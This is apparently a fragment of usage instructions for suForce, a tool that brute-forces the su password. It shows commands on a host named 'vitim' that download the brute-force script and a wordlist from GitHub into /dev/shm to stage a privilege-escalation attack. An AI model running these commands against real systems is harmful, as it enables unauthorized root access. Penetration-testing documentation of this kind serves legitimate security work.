```cmd
user@vitim:~$ cd /dev/shm
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/suForce.sh"
user@vitim:~$ wget -q "https://raw.githubusercontent.com/d4t4s3c/suForce/main/techyou.txt"
```

- <kbd>Use</kbd>

